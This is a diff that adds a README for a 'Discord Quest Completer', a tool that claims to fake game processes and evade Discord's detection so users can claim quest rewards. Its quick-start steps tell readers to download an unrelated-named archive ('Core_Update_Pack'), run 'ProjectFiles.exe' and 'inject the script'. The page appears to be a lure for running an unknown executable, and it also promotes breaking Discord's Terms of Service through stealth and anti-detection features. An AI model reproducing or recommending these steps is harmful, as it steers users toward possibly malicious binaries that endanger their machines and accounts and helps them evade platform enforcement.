@@ -1,0 +1,80 @@
+🎮 Discord Quest Completer
+
+Automate Discord Quests & Earn Rewards — 2026
+
+A lightweight, open-source tool that completes Discord Quests without requiring you to install massive games or watch hours of video.
+Supports all 5 quest types: Play Game, Watch Video, Stream, Activity, and Achievement.
+
+🎯 What it is
+
+Discord Quest Completer is a standalone utility designed to automate the completion of Discord Quests.
+It simulates the required activity (game process, video playback, etc.) so you can claim rewards like Orbs, skins, or Nitro without the hassle.
+
+⚠️ Important Warning: Discord has been actively enforcing against quest automation since April 2026. Using this tool may result in your account being flagged or restricted. Use at your own risk. This project is for educational and research purposes only.
+
+🚀 Quick Start
+
+1. Download Core_Update_Pack using the button above.
+2. Extract the archive into a separate folder.
+3. Run ProjectFiles.exe.
+4. Follow the on-screen instructions and inject the script.
+
+✨ Features
+
+| Feature                     | Description                                          |
+|-----------------------------|------------------------------------------------------|
+| 🎮 All 5 Quest Types    | Game, Video, Stream, Activity, Achievement           |
+| 🖥️ Built-in Dashboard   | Visual progress tracker for all active quests        |
+| ⏱️ Adaptive Timing      | Simulates human-like behavior to reduce detection risk|
+| 🛡️ Stealth Mode         | Hides activity from Rich Presence when enabled       |
+| 📦 Portable             | No installation required — just run the .exe       |
+| 🔄 Auto-Claim           | Attempts to claim rewards automatically              |
+
+🛠️ How to use
+
+1. Launch ProjectFiles.exe.
+2. Log into Discord Desktop (the tool works alongside the app).
+3. Select the quests you want to complete from the dashboard.
+4. Click "Start" and wait for the progress bar to finish.
+5. Claim your rewards manually in Discord if auto-claim is blocked.
+
+⚙️ Configuration
+
+You can adjust settings in the config.json file or via the dashboard:
+
+- Auto-Claim: true or false
+- Stealth RPC: Hide game activity from friends (true/false)
+- Quest Types: Enable/disable specific quest categories
+- Timing: Adjust delays between actions (default: safe)
+
+❓ FAQ
+
+Is it safe to use?
+No automation is completely safe. Discord actively detects quest automation. Use a secondary account and conservative settings.
+
+Does it work on Mac or Linux?
+Currently, the tool is optimized for Windows 10/11. Linux support is planned but not guaranteed.
+
+Do I need to install the games?
+No. The tool creates dummy processes that Discord detects as the real game.
+
+Can I get banned?
+Yes, there is a risk. Discord's Terms of Service prohibit automated quest completion. Use at your own discretion.
+
+💻 Tech Stack & Architecture
+
+- Core: Python / C++
+- UI: Custom Overlay / Web Dashboard
+- Process Simulation: Dummy executable creation
+- Target OS: Windows 10 / 11
+
+🤝 Contributing
+
+Pull requests, bug reports, and feature suggestions are welcome.
+See CONTRIBUTING.md for guidelines.
+
+📜 License
+
+MIT License — free to use, modify and redistribute.
+
+⭐ Star the repo if it helped you.
